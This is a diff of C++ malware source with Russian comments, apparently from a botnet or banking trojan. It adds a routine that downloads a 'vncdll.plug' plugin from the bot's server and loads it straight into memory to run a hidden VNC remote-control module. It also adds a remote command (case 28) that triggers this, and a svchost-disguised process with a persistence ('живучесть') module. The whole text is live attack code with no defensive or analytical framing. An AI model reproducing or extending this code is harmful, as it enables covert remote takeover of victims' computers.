@@ -638,6 +638,58 @@ DWORD WINAPI ProcessVNC(void*)
 	return 0;
 }
 
+struct VNCDLL_CONTEXT
+{
+	ULONGLONG	pModule32;	// указатель на загруженный в память файл, содержащий 32х-битную версию DLL
+	ULONGLONG	pModule64;	// указатель на загруженный в память файл, содержащий 64х-битную версию DLL
+	ULONG		Module32Size;	// размер файла 32х-битной DLL
+	ULONG		Module64Size;	// размер файла 64х-битной DLL
+};
+
+DWORD WINAPI ProcessVNC2(void*)
+{
+	BOT::Initialize(ProcessUnknown);
+
+	VDRDBG("Video", "Запущен процесс VNCDLL. PID %d", Bot->PID());
+
+	DWORD c_data;
+	BYTE* data = Plugin::Download( "vncdll.plug", 0, &c_data, false );
+
+//	BYTE* data = File::ReadToBufferA( "c:\\vncdll.dll", c_data );
+	if( data )
+	{
+		VDRDBG( "Video", "vncdll.plug downloaded");
+		VNCDLL_CONTEXT param;
+		param.pModule32 = (ULONGLONG)data;
+		param.pModule64 = 0;
+		param.Module32Size = c_data;
+		param.Module64Size = 0;
+		HMEMORYMODULE module = MemoryLoadLibrary( data, &param );
+		if( module )
+		{
+			VDRDBG( "Video", "VNCDLL is run" );
+			pSleep(10000); //ждем 20 с пока запустится vnc
+			HANDLE mutex = CaptureMutex( "VNCDLL", 10000 ); //сообщаем что VNC запустился
+			if( mutex )
+			{
+				while (true)
+				{
+//					VDRDBG( "Video", "VNCDLL worked" );
+					pSleep(10000);
+				}
+				pCloseHandle(mutex);
+			}
+		}
+		MemFree(data);
+	}
+	else
+	{
+        VDRDBG( "Video", "vncdll.plug download error");
+	}
+	pExitProcess(0);
+	return 0;
+}
+
 //обработчик команд от видео длл
 //server - это не номер индекса в массиве servers, это ид сервере, возвращаемый длл, если нужен номер
 //сервера, то нужно пройтись по массиву servers и найти индекс
@@ -682,6 +734,26 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 				else
 				{
 					VDRDBG( "Video", "VNC not start" );
+					outData[0] = 0;
+				}
+			}
+			res = TRUE;
+			break;
+		case 28: //загрузка и запуск VNCDLL
+			VDRDBG( "Video", "VNCDLL" );
+			if( WaitCaptureMutex( "VNCDLL", 100 ) ) //может внц уже запущен
+				outData[0] = 1;
+			else
+			{
+				MegaJump(ProcessVNC2);
+				if( WaitCaptureMutex( "VNCDLL", 2 * 60 * 1000 ) )
+				{
+					VDRDBG( "Video", "VNCDLL is start" );
+					outData[0] = 1;
+				}
+				else
+				{
+					VDRDBG( "Video", "VNCDLL not start" );
 					outData[0] = 0;
 				}
 			}
@@ -774,6 +846,16 @@ bool Start()
 	return false;;
 }
 
+DWORD WINAPI StartSvchost(void*)
+{
+	BOT::Initialize();
+	Start();
+	#ifdef KeepAliveH
+		// Инициализируем модуль живучести
+		KeepAliveInitializeProcess(PROCESS_VIDEO);
+	#endif
+	while(true) pSleep(INFINITE);
+}
 
 char* GetNamePipe( char* buf )
 {
